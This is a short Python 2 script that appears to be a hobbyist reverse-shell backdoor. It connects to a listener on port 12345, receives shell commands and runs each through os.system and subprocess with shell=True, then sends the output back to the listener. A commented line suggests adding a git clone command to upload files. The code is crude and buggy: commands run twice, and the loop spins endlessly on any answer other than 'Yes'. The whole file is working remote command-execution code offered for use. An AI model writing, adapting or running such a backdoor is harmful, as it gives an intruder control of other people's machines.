#!/usr/bin/env python

import socket
import subprocess
import sys
import os
import time
import commands
from ceaser import *

#add another varible [cmd1] with a git clone command if you want to upload a file
Fail1 = "Failed To Run Command. Did You Get The OS Cmd Right?"

Fail2 = "Failed To Recive Files."

Grunting = "UHHHH, We Are Ready."

boolean = True
s = socket.socket()
host = socket.gethostbyname(socket.gethostname())
port = 12345
conn = s
try:
    s.connect((host, port))
except:
    print "Failed To Connect To Host"
conn.send(Grunting)

#os.system(cmd1)

def recv_cmd():
    Cmd = conn.recv(1024)

    os.system(Cmd)
    Output = subprocess.check_output(Cmd, shell=True)
    conn.send(Output)

recv_cmd()

try:
    Again2 = conn.recv(1024)
except:
    print "" #If you are trouble shooting add something here


while True:
    if Again2 == 'Yes':
        recv_cmd()

    else:
        print ""
#except IOError, e:
            # ooops, check the attributes of e to see precisely what happened.
 #               if e.errno != 32:
                # I don't know how to handle this
  #                  raise


